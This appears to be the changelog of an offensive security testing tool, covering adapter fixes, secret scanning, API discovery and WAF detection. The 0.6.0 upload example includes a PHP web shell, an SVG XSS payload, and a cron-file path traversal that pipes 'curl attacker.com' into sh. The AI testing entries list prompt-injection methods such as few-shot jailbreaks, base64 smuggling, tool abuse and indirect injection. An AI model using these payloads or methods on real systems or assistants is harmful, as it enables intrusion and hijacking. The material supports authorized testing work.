_sev_rank = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
_conf_rank = {"confirmed": 0, "likely": 1, "possible": 2}
all_findings = []
for rtype in required:
    best = sorted(
        type_matches[rtype],
        key=lambda f: (
            _sev_rank.get(f.get("severity", "info"), 4),
            _conf_rank.get(f.get("confidence", "possible"), 2),
        ),
    )
    all_findings.append(best[0])
```

The sort is stable — ties preserve insertion order. This ensures the strongest available evidence anchors each chain, producing higher-quality chain scores and more actionable reports.

### CORR-4: Temp file leak in FfufAdapter and ArjunAdapter

> `src/boba/adapters/ffuf.py:57-60`, `src/boba/adapters/arjun.py:64-67`

Both adapters create a temporary output file for the tool to write JSON results into:

```python
tf = tempfile.NamedTemporaryFile(suffix=".json", prefix="boba_ffuf_", delete=False)
tf.close()
output_file = Path(tf.name)
```

`BaseAdapter` provides `_create_temp_file(lines, suffix)` which writes content *and* appends the path to `self._temp_files` for cleanup. But ffuf/arjun need *empty* output files (the tool writes to them), so they can't use `_create_temp_file()`. The problem is they also never registered the file with `self._temp_files`.

`BaseAdapter._cleanup_temp_files()` iterates `self._temp_files` and deletes each one. Without registration, if the adapter crashed between file creation and the point where it reads + deletes the output file, the temp file persisted on disk indefinitely.

**Fix:** Added `self._temp_files.append(output_file)` immediately after file creation in both adapters:

```python
tf = tempfile.NamedTemporaryFile(suffix=".json", prefix="boba_ffuf_", delete=False)
tf.close()
output_file = Path(tf.name)
self._temp_files.append(output_file)  # register for cleanup
```

Now `_cleanup_temp_files()` (called in `BaseAdapter.run()`'s `finally` block) will clean up the file even if the adapter crashes mid-run.

### CORR-5: Redundant `test_params` re-initialization in `test_xss` and `test_sqli`

> `src/boba/tools/vuln.py` (two sites)

Both `test_xss` and `test_sqli` initialized `test_params` at the top of the function and identically re-initialized it after the main detection loop:

**`test_xss`:**
```python
test_params = params or {"q": ""}   # line 548 — initial assignment
# ... ~135 lines of detection logic ...
test_params = params or {"q": ""}   # line 683 — identical re-assignment (dead code)
```

**`test_sqli`:**
```python
test_params = params or {"id": "1"}  # line 728 — initial assignment
# ... ~206 lines of detection logic ...
test_params = params or {"id": "1"}  # line 934 — identical re-assignment (dead code)
```

The `params` argument is never mutated within the function body, so the second assignment always produces the same result as the first. These are copy-paste artifacts — likely from duplicating the initialization block at the bottom when the persist/coverage code was added.

**Fix:** Removed both redundant lines. The subsequent `param_str = ",".join(test_params.keys())` and coverage loop continue to reference the `test_params` variable set at the top of each function.

---

## 0.6.1 — Bug Fixes: Race Test Type & JSON Import

**Date:** 2026-04-06  
**Scope:** 2 bugs in `src/boba/tools/vuln.py`. 0 new tests, 0 regressions (722 tests pass).

### BUG-1: `test_race` inconsistent `test_type` on total failure

> `src/boba/tools/vuln.py:1175`

When all concurrent requests in `test_race` raise exceptions (total failure), the function returned `test_type="race_condition"`. Every other code path in `test_race` uses `test_type="race"`, and the finding is persisted via `_persist_finding(…, "race")`.

The `findings` table has a `UNIQUE(hunt_id, finding_type, url, method, parameter)` constraint. The inconsistent type string meant a "total failure" result could never collide with an existing finding row for the same endpoint, silently breaking dedup. If a previous run had recorded a `"race"` finding for the same URL, and a later run hit total failure, the `"race_condition"` result would be treated as a distinct finding rather than an update.

**Fix:**

```python
# Before
test_type="race_condition",

# After
test_type="race",
```

Single-line change. The `test_type` field is an identity key — it must match everywhere: return values, persistence calls, coverage records, and chain rule `required_types`.

### BUG-2: `_bodies_similar` shadowed module-level `json` import

> `src/boba/tools/vuln.py:2163`

`_bodies_similar()` contained a local import inside the function body:

```python
import json as _json  # line 2163
```

The module already imports `json` at line 6:

```python
import json as _json_mod  # line 6
```

This created two different aliases for the same module in the same file. The local import worked but had two issues:

1. **Per-call overhead.** Python's `import` statement inside a function body re-executes import machinery on every call (lock acquisition, `sys.modules` dict lookup). `_bodies_similar` is called in hot paths during IDOR comparison loops.

2. **Maintenance trap.** Two aliases (`_json` and `_json_mod`) for the same module invites confusion. A future contributor could reasonably assume `_json` refers to something different, or use the wrong alias in a refactor.

**Fix:** Removed the local `import json as _json` and replaced all 4 usages with the existing module-level `_json_mod`:

| Line | Before | After |
|------|--------|-------|
| 2163 | `import json as _json` | *(deleted)* |
| 2166 | `_json.loads(body_a)` | `_json_mod.loads(body_a)` |
| 2167 | `_json.loads(body_b)` | `_json_mod.loads(body_b)` |
| 2177 | `_json.dumps(json_a, ...)` | `_json_mod.dumps(json_a, ...)` |
| 2178 | `_json.dumps(json_b, ...)` | `_json_mod.dumps(json_b, ...)` |

---

## 0.6.0 — V4 Phase 7: Multipart File Upload

**Date:** 2026-04-06  
**Scope:** 1 new method on `HttpClient`. Completes the V4 enrichment plan. 8 new tests, 0 regressions (722 tests pass).

`HttpClient` previously had no way to send `multipart/form-data` requests without manually constructing the boundary encoding in a raw string body — an error-prone approach that required the agent to know the exact multipart wire format. The new `upload()` method accepts a typed `files` dict mapping field names to `(filename, content_bytes, content_type)` tuples, delegates boundary construction to httpx, and records a human-readable summary to HTTP history. File upload vulnerability testing (unrestricted upload → RCE, path traversal via filename, XSS via SVG/HTML) is now a first-class operation alongside `request()`, `fuzz()`, and `replay()`.

This is the final phase of the [V4 enrichment plan](executing/v4-enrichment-plan.md). All seven phases are now shipped.

### `upload()` — multipart/form-data file upload method

> `src/boba/interaction/http.py`

New method on `HttpClient`:

```python
async def upload(
    self,
    method: str,
    url: str,
    files: dict[str, tuple[str, bytes, str]],  # {field: (filename, content, content_type)}
    fields: dict[str, str] | None = None,
    headers: dict[str, str] | None = None,
    cookies: dict[str, str] | None = None,
    source: str = "http_client",
    tags: list[str] | None = None,
    follow_redirects: bool = True,
    timeout_seconds: float | None = None,
) -> HttpResponse:
```

Key design decisions:

- **`files=` not `content=`**: passes `files=` and `data=` to httpx, which is what triggers multipart encoding with a generated boundary. `Content-Type: multipart/form-data; boundary=...` is set by httpx automatically — the method must not set it manually, or httpx skips boundary injection and the server rejects the request.
- **History summary**: since there is no single string body, `request_body` in http_history is recorded as `<multipart: files=[...], fields=[...]>`. Stores file names (for audit) without storing raw file bytes (which would bloat SQLite).
- **Full parity with `request()`**: network error handling, body size cap, redirect tracking, `timeout_seconds`, `tags`, and `source` all work identically.

**Agent workflow:**

```python
# Unrestricted file upload (RCE)
resp = await http_client.upload(
    method="POST",
    url="https://app.target.com/api/upload",
    files={"avatar": ("shell.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg")},
    fields={"description": "Profile photo"},
)

# XSS via SVG upload
resp = await http_client.upload(
    method="POST",
    url="https://app.target.com/api/upload",
    files={"file": ("xss.svg", b'<svg><script>alert(1)</script></svg>', "image/svg+xml")},
)

# Path traversal via filename
resp = await http_client.upload(
    method="POST",
    url="https://app.target.com/api/upload",
    files={"file": ("../../../etc/cron.d/backdoor", b"* * * * * root curl attacker.com|sh", "text/plain")},
)
```

---

## 0.5.10 — Python 3.12 Deprecation Fixes

**Date:** 2026-04-06  
**Scope:** 2 low-severity code quality fixes surfaced during a pre-push production readiness sweep. No behavioural changes. 0 new tests, 0 regressions (714 tests pass).

`asyncio.get_event_loop()` was used throughout `vuln.py` for wall-clock deadline tracking inside async test functions. In Python ≥ 3.10 this call emits a `DeprecationWarning` when made from within a running coroutine; in Python 3.12 the warning became louder and will become an error in a future release. All 15 call sites were updated to `asyncio.get_running_loop()`, which is explicit about requiring a running event loop and carries no deprecation burden. Separately, `test_ai_conversation()` was compiling the four credential-leak regex patterns on every invocation — moved to a module-level constant `_AI_CRED_PATTERNS` alongside the existing module-level `_WAF_STATUS_CODES` and `_WAF_BODY_SIGNATURES`.

### LOW — `asyncio.get_running_loop()` replaces `get_event_loop()` across all deadline call sites

> `src/boba/tools/vuln.py`

Every vuln test function uses a `_deadline = loop.time() + max_test_seconds` pattern to cap total wall-clock time. All 15 usages called `asyncio.get_event_loop().time()`. `get_event_loop()` is deprecated in coroutine context since Python 3.10 because it can silently create a new event loop when none is running — a footgun that masks bugs in test harnesses. `get_running_loop()` raises `RuntimeError` if called outside a running loop, making the requirement explicit and eliminating the warning.

**Before:** `asyncio.get_event_loop().time()` — 15 call sites across `test_ssrf`, `test_xss`, `test_sqli`, `test_ai`, `test_ai_conversation`, and others.  
**After:** `asyncio.get_running_loop().time()` — same semantics, no deprecation warning, correct behaviour in all supported Python versions (3.11+).

---

### LOW — Credential regex patterns compiled once at module load

> `src/boba/tools/vuln.py`

`test_ai_conversation()` compiled `ai_payloads.CREDENTIAL_PATTERNS` into regex objects on every call:

```python
_cred_patterns = [re.compile(p, re.IGNORECASE) for p in ai_payloads.CREDENTIAL_PATTERNS]
```

Python's `re` module maintains an internal LRU cache for compiled patterns, but the cache has a fixed upper bound and can evict entries under load. Promoted to a module-level constant `_AI_CRED_PATTERNS`, consistent with `_WAF_BODY_SIGNATURES` and `_JSON_STRUCTURAL_RE` already at module scope. The inner `_check_response` closure now references `_AI_CRED_PATTERNS` directly.

**Before:** Four patterns recompiled on every `test_ai_conversation()` call.  
**After:** `_AI_CRED_PATTERNS` compiled once at import time.

---

## 0.5.9 — Post-Audit Correctness Fixes

**Date:** 2026-04-06  
**Scope:** 3 targeted correctness fixes identified by an independent multi-agent audit of the V4 codebase. No new features. 5 new tests, 0 regressions (709 tests pass).

A four-agent audit of the shipped V4 code identified three latent bugs: the Kiterunner priority boost performing a normalized-key set lookup with a raw URL (silently no-ops when Kiterunner URLs happen to carry query params), `upsert_api_endpoint` dropping `host`/`path` on conflict (unlike every other metadata field in the same upsert), and `_redact` fully hiding only secrets of ≤ 8 characters — meaning common 9–12 character passwords exposed 67–89% of their content.

### MEDIUM — Kiterunner priority boost uses normalized endpoint key

> `src/boba/analysis/prioritize.py`

`api_endpoint_keys` is built by passing each Kiterunner URL through `_endpoint_key()`, which strips query string and fragment and returns a `(method, normalized_url)` tuple. The lookup inside the scoring loop was using the raw URL dict value instead of the loop's `endpoint_key` variable, which is already the normalized key. The two agreed today because Kiterunner URLs never carry query params, but the bug would silently suppress the +3.0 boost the moment any such URL appeared.

**Before:** `ep_lookup = (ep["method"].upper(), url); if ep_lookup in api_endpoint_keys:`  
**After:** `if endpoint_key in api_endpoint_keys:` — uses the variable already holding the normalized key.

---

### MEDIUM — `upsert_api_endpoint` now enriches `host` and `path` on conflict

> `src/boba/core/context.py`

The `ON CONFLICT DO UPDATE SET` clause updated `status_code`, `content_type`, `content_length`, `framework`, `sources`, and `updated_at` — but left `host` and `path` out. A sparse first insert (e.g., from a tool that omits those fields) would permanently lock them as empty strings, since subsequent upserts with populated values had no update path. Added the same `CASE WHEN excluded.X != '' THEN excluded.X ELSE api_endpoints.X END` pattern already used for `content_type` and `framework`. Two new tests cover both directions: empty → populated updates, and populated → empty preserves.

**Before:** `host`/`path` omitted from `DO UPDATE SET`; first-write value was permanent.  
**After:** Both fields enrich on conflict, consistent with all other metadata columns.

---

### LOW — `_redact` full-redaction threshold raised from 8 to 16 characters

> `src/boba/adapters/gitleaks.py`

The previous threshold (`<= 8`) left common password lengths (9–12 chars) partially revealed: a 9-character secret produced `Xxxx****Zzzz`, exposing 8 of 9 characters and making brute-force trivial. Raised the threshold to `<= 16` so all typical passwords are fully replaced with `****`. Secrets longer than 16 characters (API keys, tokens) continue to show the first and last 4 characters to aid identification. The docstring was also corrected — the previous wording claimed "at most 25% revealed", which was inaccurate for 17–31 character secrets. Three new tests assert the boundary behaviour at 9, 16, and 17 characters.

**Before:** `len(value) <= 8` → full redact; 9-char `P@ssw0rd!` → `P@ss****0rd!`.  
**After:** `len(value) <= 16` → full redact; 9-char `P@ssw0rd!` → `****`.

---

## 0.5.8 — Code Quality Audit & Correctness Fixes

**Date:** 2026-04-06  
**Scope:** 4 targeted correctness fixes identified during a post-V4 production-readiness audit. No new features. 0 regressions (709 tests pass).

A full audit of the V4 codebase surfaced four bugs where the implementation diverged from the intended contract: a missing hunt-existence guard on `log_tool_run` (the only write method without one), PITCHFORK fuzzing silently producing zero results instead of surfacing a misconfiguration error, Nuclei's `reference` field being dropped when the upstream API returns a bare string rather than an array, and httpx's port field using `0` as a sentinel for "not present" when `None` is the correct type. Tests for the changed behaviours were updated to assert the corrected contracts.

### MEDIUM — `log_tool_run` now validates hunt existence before writing

> `src/boba/core/context.py`

Every other write method in `HuntContext` calls `self._ensure_hunt(hunt_id)` before executing its INSERT or UPSERT. `log_tool_run` was the sole exception: a bad `hunt_id` would produce an `IntegrityError` from the FK constraint rather than the cleaner, documented `HuntNotFoundError`. Added the guard for consistency with the rest of the persistence layer.

**Before:** FK `IntegrityError` on invalid `hunt_id`.  
**After:** `HuntNotFoundError` with a clear message, matching all other write paths.

---

### MEDIUM — PITCHFORK fuzz misconfiguration now raises `ValueError`

> `src/boba/interaction/http.py`

PITCHFORK attack mode pairs payload positions by index: every position must have a payload list for `zip` to produce any combinations. Previously, a missing position caused `zip(*payload_lists)` to return `[]` — the fuzz run would complete with zero requests and only a `logger.warning` as evidence. Callers had no way to distinguish "no vulnerabilities found" from "fuzz never ran". Changed to raise `ValueError` with the list of missing positions so the misconfiguration surfaces immediately.

**Before:** Silent empty result with a debug-level warning.  
**After:** `ValueError: PITCHFORK requires payloads for all positions; missing: [...]`

---

### LOW — Nuclei `reference` field preserves bare-string values

> `src/boba/adapters/nuclei.py`

The Nuclei JSON schema allows `info.reference` to be either a list of strings or a single string. The previous coercion (`value if isinstance(value, list) else []`) silently dropped single-string references. Extracted `_coerce_list` and `_coerce_tags` helpers: lists pass through unchanged, bare strings are wrapped in a single-element list, and anything else (null, dict) becomes `[]`. The `tags` field received the same treatment (was a one-liner; now a named function for clarity).

**Before:** `reference: "https://cve.mitre.org/..."` → `[]`.  
**After:** `reference: "https://cve.mitre.org/..."` → `["https://cve.mitre.org/..."]`.

---

### LOW — httpx `port` field uses `None` for absent port, not `0`

> `src/boba/adapters/httpx_runner.py`

Port `0` is a reserved port number (OS-assigned ephemeral); using it as a sentinel for "httpx did not report a port" is semantically wrong and can cause downstream consumers to treat it as a real port. Changed to return `None` when the field is absent, consistent with `status_code` and `content_length` on the same record. Naabu (a dedicated port scanner) retains `or 0` as its default since it always scans for a port.

**Before:** Missing port field → `"port": 0`.  
**After:** Missing port field → `"port": None`.

---

## 0.5.7 — V4 Enrichment Prod Readiness Fixes

**Date:** 2026-04-06  
**Scope:** 8 functional fixes across V4 phases 4-6. Secret scanning now honors explicit repo/org targets instead of filtering them out by `github.com`, method-specific API endpoints stay distinct in prioritization, AI conversation mode correctly detects AWS keys and respects explicitly disabled modes, and IDOR now surfaces WAF blocking on the standard 3-request flow. 10 new tests, 0 regressions (709 tests pass).

The V4 phase implementations were feature-complete, but a production-readiness review found a handful of contract-level gaps: GitHub-backed secret findings were being dropped as out-of-scope for normal hunts, org/user secret scanning was documented but not implemented, coverage/prioritization collapsed GET and POST endpoints onto the same URL key, uppercase AWS access keys were missed in AI conversation mode, and IDOR WAF detection did not collect enough responses to ever fire on the baseline owner/attacker/unauth flow. This release closes those gaps without changing the external V4 feature set.

### HIGH — Secret scanning now works for real hunts

> `src/boba/adapters/gitleaks.py`  
> `src/boba/tools/recon.py`  
> `src/boba/cli/main.py`

- **Gitleaks scope handling fixed** — `GitleaksAdapter` no longer post-filters findings against `github.com` or local filesystem paths. Secret scanning now trusts the explicitly requested repo/org target instead of incorrectly treating the repo host as the hunted asset.
- **GitHub org/user enumeration implemented** — `recon.secrets()` now expands org/user handles through the public GitHub repos API and scans each discovered repo, aggregating the results for persistence and CLI output.
- **CLI contract fixed** — `boba recon secrets` now accepts `--repo` without requiring a dummy `--target`, while still raising a clear error if neither `--target` nor `--repo` is provided.

### MEDIUM — Secret dedupe no longer breaks on missing line numbers

> `src/boba/core/context.py`

- **`upsert_secret()` now handles `line_number IS NULL` correctly** — SQLite UNIQUE constraints treat `NULL` values as distinct, so repeated scans of the same secret with no line metadata inserted duplicates. The upsert path now detects existing NULL-line rows explicitly and updates them in place instead of creating duplicates.

### MEDIUM — Prioritization is now method-aware end-to-end

> `src/boba/analysis/prioritize.py`

- **Method-specific endpoints preserved** — Kiterunner discoveries are now keyed by normalized `(method, url)` pairs, so `GET /api/users` and `POST /api/users` no longer overwrite each other in the priority queue.
- **Coverage filtering fixed** — tested coverage is also keyed by `(method, url)`, so recording coverage for one method no longer suppresses untested write methods on the same route.

### MEDIUM — AI conversation detection correctness tightened

> `src/boba/tools/vuln.py`

- **AWS credential leaks detected correctly** — credential regexes are now matched against the raw response body (case-insensitive) instead of a lowercased copy, so uppercase AWS access keys (`AKIA...`) are no longer missed.
- **Explicitly disabled modes stay disabled** — `test_ai_conversation()` now only fills in default `conversations`, `tool_payloads`, and `indirect_payloads` when the caller passes `None`; passing `[]` now truly disables that mode instead of silently restoring defaults.

### LOW — IDOR WAF signal now works on the standard flow

> `src/boba/tools/vuln.py`

- **Baseline IDOR responses are now included in WAF detection** — the owner and unauthenticated responses are added to the WAF sample set, so the usual 3-request IDOR flow can now correctly produce `waf_detected=True` when all three responses are blocked by the same template page.

### Test updates

- Added regression tests for:
  - gitleaks explicit-target passthrough
  - GitHub org repo enumeration in `recon.secrets()`
  - secret dedupe when `line_number` is NULL
  - method-aware prioritization and method-aware coverage exclusion
  - repo-only `boba recon secrets --repo ...`
  - AWS key detection in `test_ai_conversation()`
  - empty-list mode disabling in `test_ai_conversation()`
  - IDOR WAF detection on the baseline 3-request flow

---

## 0.5.6 — V4 Phase 6: AI Multi-Turn Conversation

**Date:** 2026-04-06
**Scope:** V4 enrichment Phase 6. New `test_ai_conversation()` enables multi-turn POST/JSON chatbot testing with three attack modes: gradual escalation conversations, tool/function abuse probes, and indirect injection. 11 new tests, 0 regressions (699 tests pass).

Before this change, `test_ai` sent single GET requests with payloads in a query parameter. Real LLM features are conversational — POST endpoints accepting JSON with message history. The most effective prompt injection techniques (few-shot jailbreaking, context pollution, gradual escalation) require multi-turn interaction. This phase transforms Boba's AI testing from "inject one string" to "have a conversation that leads to compromise."

### NEW — Conversation, tool abuse, and indirect injection payloads

> `src/boba/payloads/ai.py`

- `CONVERSATIONS` — 5 multi-turn conversation payloads: gradual escalation, few-shot jailbreak, context window pollution, role confusion, instruction smuggling via base64 encoding
- `TOOL_ABUSE` — 5 single-turn probes targeting function/tool calling capability
- `INDIRECT` — 4 indirect injection payloads: HTML comment injection, system tag injection, conversation format smuggling, markdown separator injection
- `TOOL_ABUSE_INDICATORS` — 7 response indicators for tool/function abuse detection (`function_call`, `tool_use`, `tool_result`, `action_input`, etc.)
- `CREDENTIAL_PATTERNS` — 4 compiled regexes for credential leak detection: generic API keys, AWS access keys (`AKIA…`), OpenAI/Anthropic keys (`sk-…`), GitHub PATs (`ghp_…`)

### NEW — `test_ai_conversation()`

> `src/boba/tools/vuln.py`

Multi-turn AI testing function that POSTs JSON bodies and accumulates conversation history across turns. Three attack modes run sequentially, stopping on first confirmed finding:

1. **Conversations** — sends each turn with accumulated history, checking every response for canary markers and leak indicators
2. **Tool abuse** — single-turn probes targeting function calling (no history needed)
3. **Indirect injection** — payloads embedded in structured content the LLM processes

Five detection types: canary markers (CONFIRMED), system prompt leak indicators (LIKELY), tool abuse response patterns (LIKELY), credential regex patterns (CONFIRMED), WAF blocking. Evidence is tagged with `instruction_override`, `system_prompt_leak`, `function_call`, and `credential_leak` types that the AI chain rules from Phase 2 match against. Configurable `message_field` and `history_field` parameters adapt to different API shapes. Deadline enforcement via `max_test_seconds` caps total wall-clock time across all modes.

### UPDATED — CLI `boba test ai`

> `src/boba/cli/main.py`

Added flags: `--mode` (`single` | `conversation`, default: `single`), `--message-field` (default: `message`), `--history-field` (default: `messages`). Default behavior unchanged — `--mode single` still calls `test_ai()`.

---

## 0.5.5 — V4 Phase 5: API Surface Mapping

**Date:** 2026-04-06
**Scope:** V4 enrichment Phase 5. Kiterunner adapter discovers API endpoints invisible to crawlers — REST conventions like `POST /api/v2/transfers` that aren't linked from the frontend. `api_endpoints` table, prioritization integration, CLI commands. 1 adapter, 1 table, ~30 new tests, 0 regressions (688 tests pass).

Before this change, the agent could only test endpoints found via crawling (katana) or historical URL discovery (gau/waybackurls). Kiterunner understands REST patterns and tests multiple HTTP methods per path — it surfaces state-changing endpoints that are prime targets for IDOR, auth bypass, and mass assignment. Kiterunner-discovered API endpoints now get a higher base priority score than crawler-found URLs, and state-changing methods (POST, PUT, DELETE, PATCH) get an additional score bonus.

### NEW — `KiterunnerAdapter`

> `src/boba/adapters/kiterunner.py`

- `TOOL_NAME = "kiterunner"`, `BINARY_NAMES = ["kr"]`, `OUTPUT_FORMAT = OutputFormat.PLAIN_LINES`, `PRODUCES = "api_endpoint"`, `SCOPE_MODE = "pre"`
- Parses Kiterunner's plain-text output format (`GET  200 [4521, 45, 12] https://…`) via `_KR_LINE_RE` regex; fallback parser handles non-standard lines
- Also accepts JSON dict input for future `-oJ` flag usage
- Command shape: `kr scan <url> [-w <wordlist>] [-x <rate_limit>] --fail-status-codes 404,400`
- Registered in adapter registry (`adapters/__init__.py`)

### NEW — `api_endpoints` table

> `src/boba/core/context.py`

- Schema: `(hunt_id, url, method, status_code, content_type, content_length, host, path, framework, sources, created_at, updated_at)`
- Unique constraint: `(hunt_id, url, method)` — same endpoint with different methods gets separate rows
- `upsert_api_endpoint()`: merges sources, COALESCE-preserves `status_code`/`content_length`, preserves non-empty `content_type`/`framework`
- `get_api_endpoints()`: filterable by `host` and `method`
- Indexed on `(hunt_id)` and `(hunt_id, host)`; `api_endpoints` added to `_STATS_TABLES`

### NEW — `enum.api()` tool function

> `src/boba/tools/enum.py`

Composition function: pulls alive hosts from context if no explicit targets, scope check → `KiterunnerAdapter.run()` → persist via `upsert_records` → log tool run. Accepts `wordlist` override via `AdapterConfig.extra_args_dict`.

### UPDATED — Prioritization integration

> `src/boba/analysis/prioritize.py`

Kiterunner-discovered endpoints join the scoring pool with `+3.0` base (vs `+2.0` for path-pattern-matched API endpoints). State-changing methods (POST, PUT, DELETE, PATCH) add `+1.5`. All Kiterunner endpoints suggest `idor` + `auth`; state-changing methods also suggest `mass_assign`. The Kiterunner signal takes precedence over the existing API-path-pattern signal via `elif` to avoid double-counting.

### NEW — CLI commands

> `src/boba/cli/main.py`

- `boba enum api <hunt-id> [--url <url>] [--targets <urls>] [--wordlist <path>]` — run Kiterunner discovery
- `boba context api-endpoints <hunt-id> [--host <host>] [--method <method>]` — query persisted endpoints

---

## 0.5.4 — V4 Phase 4: Secret Scanning

**Date:** 2026-04-06
**Scope:** V4 enrichment Phase 4. Gitleaks adapter scans git repositories for leaked credentials, API keys, and sensitive configuration. Secrets are redacted before persistence. `secrets` table with type classification, CLI commands. 1 adapter, 1 table, ~31 new tests, 0 regressions (658 tests pass).

Leaked AWS keys, GitHub tokens, and database passwords in public repos are instant P1 Critical findings that require zero interaction with live systems. Before this change the agent had no way to reach them. Secret scanning is now a first-class recon step — results are persisted, redacted (first 4 + last 4 characters, middle replaced with `****`), classified by type, and queryable by `secret_type` or `repo`.

### NEW — `GitleaksAdapter`

> `src/boba/adapters/gitleaks.py`

- `TOOL_NAME = "gitleaks"`, `OUTPUT_FORMAT = OutputFormat.JSON_ARRAY`, `PRODUCES = "secret"`, `SCOPE_MODE = "post"`
- Parses gitleaks' PascalCase JSON output (`RuleID`, `Secret`, `File`, `StartLine`, `Commit`, `Author`, `Date`, `Entropy`); accepts lowercase variants for forward compatibility
- `_redact()`: keeps first 4 + last 4 chars, replaces middle with `****`; secrets ≤8 chars fully redacted to `****` — full values never reach the database
- `_classify_secret_type()`: maps ~40 known gitleaks rule IDs to `key`, `token`, `password`, `certificate`, or `other`; unknown rules inferred from rule name keywords
- Registered in adapter registry (`adapters/__init__.py`)

### NEW — `secrets` table

> `src/boba/core/context.py`

- Schema: `(hunt_id, rule_id, secret_type, file_path, repo, line_number, match_preview, commit_sha, author, date, entropy, sources, created_at)`
- Unique constraint: `(hunt_id, repo, file_path, rule_id, line_number)`
- Column named `commit_sha` (not `commit`) to avoid SQLite reserved keyword conflict; `upsert_secret()` maps transparently from `record["commit"]`
- `upsert_secret()`: merges sources, preserves non-empty `match_preview`/`commit_sha`/`author`, COALESCE-preserves `entropy`
- `get_secrets()`: filterable by `secret_type` and `repo`
- Indexed on `(hunt_id)` and `(hunt_id, secret_type)`; `secrets` added to `_STATS_TABLES`

### NEW — `recon.secrets()` tool function

> `src/boba/tools/recon.py`

Accepts a target (GitHub org, user, or local repo path/URL) and optional specific `repo` URL. Scope enforcement via `SCOPE_MODE = "post"` — the repo URL hostname is the scope target. Persists via `upsert_records(..., "secret", ...)`, logs tool run, returns early with empty result for empty targets.

### NEW — CLI commands

> `src/boba/cli/main.py`

- `boba recon secrets <hunt-id> [--target <org/user>] [--repo <url>]` — run gitleaks scanning
- `boba context secrets <hunt-id> [--type key|token|password|certificate|other] [--repo <url>]` — query persisted secrets

---

## 0.5.3 — V4 Phase 3: Parameter Discovery

**Date:** 2026-04-05
**Scope:** V4 enrichment Phase 3. New Arjun adapter discovers hidden HTTP parameters (query, body, header) on known endpoints, feeding all 11 vuln engines with previously invisible attack surface. 1 new adapter, 1 new table, ~19 new tests, 0 regressions (627 tests pass).

Parameter discovery is the single highest-leverage addition in V4. Every vuln test requires knowing which parameters exist — without discovery, the agent only tests params visible in HTML forms and JS. The bugs that pay $5K+ live in hidden parameters: `debug`, `admin`, `internal`, `callback`, `redirect_url`, `role`.

### NEW — ArjunAdapter

> `src/boba/adapters/arjun.py`

Full adapter implementation following the standard lifecycle (`build_command → parse_output → extract_scope_target`):

- Supports GET, POST, and JSON body modes via `_resolve_mode()` mapping to Arjun's `-m` flag
- `parse_output()` handles 4 JSON output shapes: single-target object, multi-target URL→params mapping, JSON array, and params as string or structured objects — Arjun's output varies by version and mode
- Uses tempfile for `-oJ` output, `--stable` flag for rate-limited scanning
- Registered in adapter registry (`adapters/__init__.py`)

### NEW — `parameters` table

> `src/boba/core/context.py`

- Schema: `(hunt_id, url, method, name, param_type, sources, confirmed, created_at, updated_at)`
- Unique constraint: `(hunt_id, url, method, name, param_type)` — same param name with different types (query vs body) gets separate rows
- `upsert_parameter()`: merges sources via `json_group_array`, preserves strongest `confirmed` signal via `MAX()`
- `get_parameters()`: filterable by URL and method
- Indexed on `(hunt_id)` and `(hunt_id, url)`

### NEW — `enum.parameters()` tool function

> `src/boba/tools/enum.py`

Composition function: scope check → ArjunAdapter.run() → persist via `upsert_records` → log tool run. Accepts `method` and `body_type` overrides via `AdapterConfig.extra_args_dict`.

### UPDATED — Prioritization integration

> `src/boba/analysis/prioritize.py`

- Fetches discovered parameters and indexes by `_endpoint_key(url, method)` — normalizes URLs by stripping query strings so Arjun results on `/search` match stored URLs like `/search?q=test`
- Score boost: +2.0 for any discovered params, +1.0 additional for confirmed params (response-change verified)
- Body params on POST/PUT/PATCH endpoints add `mass_assign` to suggested tests
- Reasons include `"Arjun found N parameter(s)"` and `"N parameter(s) confirmed by response change"`

### NEW — CLI commands

> `src/boba/cli/main.py`

- `boba enum parameters <hunt-id> --url <url> [--method GET|POST] [--body-type json]` — run Arjun discovery
- `boba context parameters <hunt-id> [--url <url>] [--method <method>]` — query persisted parameters

---

## 0.5.2 — V4 Phase 2: AI Chain Rules

**Date:** 2026-04-05
**Scope:** V4 enrichment Phase 2. 4 new AI-aware chain rules so prompt injection findings get chained and upgraded instead of staying standalone. Stable evidence type identifiers for Phase 6 forward compatibility. ~8 new tests, 0 regressions (608 tests pass).

Before this change, the chaining engine had 8 rules but none involving AI findings. A prompt injection that leads to function calling abuse is a P1, but without chain rules it stayed classified as a standalone finding. Prompt injection is the fastest-growing vulnerability class (540% YoY) — the chaining engine needed to speak AI.

### NEW — AI evidence type identifiers

> `src/boba/payloads/ai.py`

Added `EVIDENCE_TYPES` list — stable string identifiers that chain rules match against:

- `instruction_override` — canary marker fired (existing detection)
- `system_prompt_leak` — leak indicators scored (existing detection)
- `function_call` — response contains tool/function invocations (Phase 6)
- `tool_use` — response contains tool-use patterns (Phase 6)
- `api_call` — response contains API call patterns (Phase 6)
- `credential_leak` — response contains leaked credentials (Phase 6)

### NEW — 4 chain rules

> `src/boba/analysis/chaining.py`

| Rule | Types | Constraint | Severity | When it fires |
|---|---|---|---|---|
| `ai_tool_abuse` | ai | evidence: function_call, tool_use, api_call | CRITICAL | Prompt injection triggers tool/API calls |
| `ai_data_exfiltration` | ai | evidence: system_prompt_leak, credential_leak, api_key | HIGH | System prompt leak reveals secrets |
| `xss_to_ai_injection` | xss + ai | same_host | CRITICAL | Stored XSS poisons LLM context |
| `ai_plus_auth_bypass` | ai + auth | same_host | CRITICAL | Auth bypass + prompt injection on privileged AI features |

Design note: `ai_tool_abuse` and `ai_data_exfiltration` are evidence-gated (require specific keywords in finding evidence), while `xss_to_ai_injection` and `ai_plus_auth_bypass` are type-gated (co-occurrence on the same host is sufficient). The plan's overly generic keywords (`"action"`, `"execute"`, `"database"`, `"internal"`) were trimmed to reduce false chain generation.

---

## 0.5.1 — V4 Phase 1: WAF Detection

**Date:** 2026-04-05
**Scope:** V4 enrichment Phase 1. All 11 vuln test functions now surface a `waf_detected` signal when responses suggest WAF blocking rather than clean results. ~8 new tests, 0 regressions (600 tests pass).

Before this change, if a WAF blocked every payload, the result was just `vulnerable=False` — indistinguishable from "endpoint is clean." A skilled human pentester recognizes WAF responses instantly and switches to bypass techniques. The agent needs this signal too.

### UPDATED — VulnTestResult model

> `src/boba/core/models.py`

Added `waf_detected: bool = False` — safe default preserves backward compatibility for all existing callers and JSON serialization.

### NEW — WAF detection heuristic

> `src/boba/tools/vuln.py`

- `_WAF_STATUS_CODES`: `{403, 406, 429, 503}`
